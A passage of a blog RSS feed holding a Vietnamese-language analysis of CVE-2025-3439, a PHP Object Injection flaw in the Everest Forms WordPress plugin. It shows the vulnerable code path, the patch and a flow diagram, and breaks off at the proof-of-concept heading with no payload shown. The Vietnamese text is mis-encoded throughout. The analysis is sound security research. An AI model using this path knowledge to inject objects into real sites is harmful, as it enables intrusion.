li·ªáu ng∆∞·ªùi d√πng khi ch∆∞a ki·ªÉm tra.&lt;/li&gt;&#xA;&lt;li&gt;Ch·ª©c nƒÉng import/export lu√¥n l√† b·ªÅ m·∫∑t t·∫•n c√¥ng nh·∫°y c·∫£m.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm so√°t serialized data (ƒë·∫∑c bi·ªát l√† chu·ªói b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;O:&lt;/code&gt;) l√† b·∫Øt bu·ªôc.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;code&gt;allowed_classes =&amp;gt; false&lt;/code&gt; ƒë·ªÉ ngƒÉn t·∫°o object khi unserialize.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ml-slider/vulnerability/wordpress-slider-gallery-and-carousel-by-metaslider-image-slider-video-slider-plugin-3-94-0-php-object-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Responsive Slider by MetaSlider Plugin &amp;lt;= 3.94.0 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3439 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-25-cve-2025-3439/</link>
      <pubDate>Tue, 25 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-25-cve-2025-3439/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Plugin Everest Forms ‚Äì Contact Form, Quiz, Survey, Newsletter &amp;amp; Payment Form Builder for WordPress&lt;/strong&gt; tr√™n WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;PHP Object Injection&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn, v√† bao g·ªìm, &lt;strong&gt;3.1.1&lt;/strong&gt; th√¥ng qua vi·ªác gi·∫£i tu·∫ßn t·ª± d·ªØ li·ªáu kh√¥ng tin c·∫≠y t·ª´ tham s·ªë &lt;code&gt;field_value&lt;/code&gt;.&#xA;ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;ch∆∞a x√°c th·ª±c&lt;/strong&gt; ch√®n m·ªôt PHP Object. Ph·∫ßn m·ªÅm d·ªÖ b·ªã t·∫•n c√¥ng n√†y &lt;strong&gt;kh√¥ng c√≥ chu·ªói POP&lt;/strong&gt; n√†o ƒë∆∞·ª£c bi·∫øt ƒë·∫øn, nghƒ©a l√† l·ªó h·ªïng n√†y s·∫Ω kh√¥ng g√¢y ·∫£nh h∆∞·ªüng tr·ª´ khi c√≥ plugin ho·∫∑c theme kh√°c ch·ª©a chu·ªói POP ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web.&#xA;N·∫øu chu·ªói POP t·ªìn t·∫°i th√¥ng qua plugin ho·∫∑c theme b·ªï sung ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n h·ªá th·ªëng m·ª•c ti√™u, n√≥ c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c hi·ªán c√°c h√†nh ƒë·ªông nh∆∞ &lt;strong&gt;x√≥a t·ªáp t√πy √Ω&lt;/strong&gt;, &lt;strong&gt;l·∫•y d·ªØ li·ªáu nh·∫°y c·∫£m&lt;/strong&gt;, ho·∫∑c &lt;strong&gt;th·ª±c thi m√£&lt;/strong&gt; t√πy thu·ªôc v√†o chu·ªói POP hi·ªán di·ªán.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3439&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3439&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/everest-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Everest Forms&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v3.1.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {&#xA;    if ( is_serialized( $field_value ) ) {&#xA;        $field_value = maybe_unserialize( $field_value );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒëo·∫°n m√£ n√†y, h√†m &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng (&lt;code&gt;$field_value&lt;/code&gt;). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy c∆° Object Injection&lt;/strong&gt;: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn &lt;strong&gt;Object Injection&lt;/strong&gt; v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thi·∫øu ki·ªÉm tra an to√†n&lt;/strong&gt;: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng c√≥ c∆° ch·∫ø fallback&lt;/strong&gt;: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v3.1.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/diff.png&#39; alt=&#34;Diff&#34; height=&#34;243&#34; width=&#34;1831&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng &lt;code&gt;evf_maybe_unserialize()&lt;/code&gt; thay cho &lt;code&gt;maybe_unserialize()&lt;/code&gt; c·ªßa WordPress:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function evf_maybe_unserialize( $data, $options = array() ) {&#xA;    if ( is_serialized( $data ) ) {&#xA;        if ( version_compare( PHP_VERSION, &amp;#39;7.1.0&amp;#39;, &amp;#39;&amp;gt;=&amp;#39; ) ) {&#xA;            $options = wp_parse_args( $options, array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;            return @unserialize( trim( $data ), $options ); //phpcs:ignore.&#xA;        }&#xA;        return @unserialize( trim( $data ) ); //phpcs:ignore.&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; ƒë∆∞·ª£c s·ª≠ d·ª•ng v·ªõi option &lt;code&gt;&#39;allowed_classes&#39; =&amp;gt; false&lt;/code&gt; ƒë√£ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng t·∫°o object, t·ª´ ƒë√≥ x·ª≠ l√Ω tri·ªát ƒë·ªÉ l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt submenu &lt;code&gt;Entries&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_submenu_page( &amp;#39;everest-forms&amp;#39;, esc_html__( &amp;#39;Everest Forms Entries&amp;#39;, &amp;#39;everest-forms&amp;#39; ), esc_html__( &amp;#39;Entries&amp;#39;, &amp;#39;everest-forms&amp;#39; ), current_user_can( &amp;#39;everest_forms_view_entries&amp;#39; ) ? &amp;#39;everest_forms_view_entries&amp;#39; : &amp;#39;everest_forms_view_others_entries&amp;#39;, &amp;#39;evf-entries&amp;#39;, array( $this, &amp;#39;entries_page&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Callback &lt;code&gt;entries_page&lt;/code&gt; ƒë∆∞·ª£c g·ªçi khi truy c·∫≠p v√†o submenu n√†y:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function entries_page() {&#xA;    EVF_Admin_Entries::page_output();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m g·ªçi ƒë·∫øn &lt;code&gt;page_output()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function page_output() {&#xA;    if ( apply_filters( &amp;#39;everest_forms_entries_list_actions&amp;#39;, false ) ) {&#xA;        do_action( &amp;#39;everest_forms_entries_list_actions_execute&amp;#39; );&#xA;    } elseif ( isset( $_GET[&amp;#39;view-entry&amp;#39;] ) ) { // phpcs:ignore WordPress.Security.NonceVerification&#xA;        include &amp;#39;views/html-admin-page-entries-view.php&amp;#39;;&#xA;    } else {&#xA;        self::table_list_output();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;code&gt;$_GET[&#39;view-entry&#39;]&lt;/code&gt; t·ªìn t·∫°i th√¨ view &lt;code&gt;html-admin-page-entries-view.php&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c include.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/entries.png&#34; title=&#34;Entries Page&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/entries.png&#34; data-sub-html=&#34;&lt;h2&gt;Entries&lt;/h2&gt;&lt;p&gt;Entries Page&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/entries.png&#39; alt=&#34;Entries&#34; height=&#34;998&#34; width=&#34;1231&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Entries Page&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trang n√†y s·∫Ω hi·ªÉn th·ªã t·∫•t c·∫£ n·ªôi dung form ƒë∆∞·ª£c submit t·ª´ ng∆∞·ªùi d√πng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$entry_meta = apply_filters( &amp;#39;everest_forms_entry_single_data&amp;#39;, $entry-&amp;gt;meta, $entry, $form_data );&#xA;...&#xA;foreach ( $entry_meta as $meta_key =&amp;gt; $meta_value ) {&#xA;    $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value );&#xA;    if ( evf_is_json( $meta_value ) ) {&#xA;        $meta_value = json_decode( $meta_value, true );&#xA;        $meta_value = $meta_value[&amp;#39;value&amp;#39;];&#xA;    }&#xA;    ...&#xA;    $field_value     = apply_filters( &amp;#39;everest_forms_html_field_value&amp;#39;, $meta_value, $entry_meta[ $meta_key ], $entry_meta, &amp;#39;entry-single&amp;#39; );&#xA;    ...&#xA;    if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {&#xA;        if ( is_serialized( $field_value ) ) {&#xA;            $field_value = maybe_unserialize( $field_value );&#xA;        }&#xA;        ...&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$entry_meta&lt;/code&gt; l√† t·∫≠p d·ªØ li·ªáu m√† ng∆∞·ªùi d√πng ƒë√£ submit t·ª´ form hi·ªán t·∫°i. M·ªói ph·∫ßn t·ª≠ trong m·∫£ng n√†y bao g·ªìm m·ªôt c·∫∑p &lt;code&gt;meta_key&lt;/code&gt; v√† &lt;code&gt;meta_value&lt;/code&gt;, v√† h·ªá th·ªëng s·∫Ω duy·ªát qua t·ª´ng ph·∫ßn t·ª≠ ƒë·ªÉ x·ª≠ l√Ω.&lt;/p&gt;&#xA;&lt;p&gt;Trong v√≤ng l·∫∑p, gi√° tr·ªã &lt;code&gt;$meta_value&lt;/code&gt; ƒë∆∞·ª£c ki·ªÉm tra:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;N·∫øu gi√° tr·ªã l√† JSON&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;H√†m &lt;code&gt;evf_is_json()&lt;/code&gt; x√°c ƒë·ªãnh xem chu·ªói c√≥ ph·∫£i JSON h·ª£p l·ªá hay kh√¥ng.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu ƒë√∫ng, d·ªØ li·ªáu ƒë∆∞·ª£c gi·∫£i m√£ b·∫±ng &lt;code&gt;json_decode()&lt;/code&gt; v√† l·∫•y gi√° tr·ªã t·∫°i &lt;code&gt;$meta_value[&#39;value&#39;]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Sau ƒë√≥ &lt;code&gt;$field_value&lt;/code&gt; ƒë∆∞·ª£c t·∫°o ra&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Gi√° tr·ªã n√†y ƒë∆∞·ª£c t·∫°o t·ª´ &lt;code&gt;$meta_value[&#39;value&#39;]&lt;/code&gt; th√¥ng qua b·ªô l·ªçc &lt;code&gt;everest_forms_html_field_value&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;X·ª≠ l√Ω d·ªØ li·ªáu serialize&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;$field_value&lt;/code&gt; c√≥ ƒë·ªãnh d·∫°ng serialize, h√†m &lt;code&gt;maybe_unserialize()&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ gi·∫£i m√£ d·ªØ li·ªáu v·ªÅ d·∫°ng b√¨nh th∆∞·ªùng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;User submits form ‚Üí Data stored in $entry_meta&amp;#34;] --&amp;gt; B[&amp;#34;Admin opens Entries page in wp-admin&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;entries_page() executed&amp;#34;]&#xA;C --&amp;gt; D{&amp;#34;GET[&amp;#39;view-entry&amp;#39;] exists?&amp;#34;}&#xA;D --&amp;gt;|No| Z[&amp;#34;Show entries table&amp;#34;]&#xA;D --&amp;gt;|Yes| E[&amp;#34;Load html-admin-page-entries-view.php&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;foreach ($entry_meta as meta_key =&amp;gt; meta_value)&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;Is meta_value JSON?&amp;#34;}&#xA;G --&amp;gt;|Yes| H[&amp;#34;json_decode() ‚Üí meta_value[&amp;#39;value&amp;#39;]&amp;#34;]&#xA;G --&amp;gt;|No| I[&amp;#34;meta_value = wp_strip_all_tags()&amp;#34;]&#xA;&#xA;H --&amp;gt; J[&amp;#34;field_value = apply_filters(&amp;#39;everest_forms_html_field_value&amp;#39;, meta_value, ...)&amp;#34;]&#xA;I --&amp;gt; J&#xA;&#xA;J --&amp;gt; K{&amp;#34;field_value is serialized?&amp;#34;}&#xA;K --&amp;gt;|No| L[&amp;#34;Display value normally&amp;#34;]&#xA;K --&amp;gt;|Yes| M[&amp;#34;maybe_unserialize(field_value) ‚Üê Vulnerable&amp;#34;]&#xA;&#xA;M --&amp;gt; N{&amp;#34;Unserialize produces object?&amp;#34;}&#xA;N --&amp;gt;|Yes| R[&amp;#34;Object Injection ‚Üí Possible exploit if POP chain exists&amp;#34;]&#xA;N --&amp;gt;|No| L&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 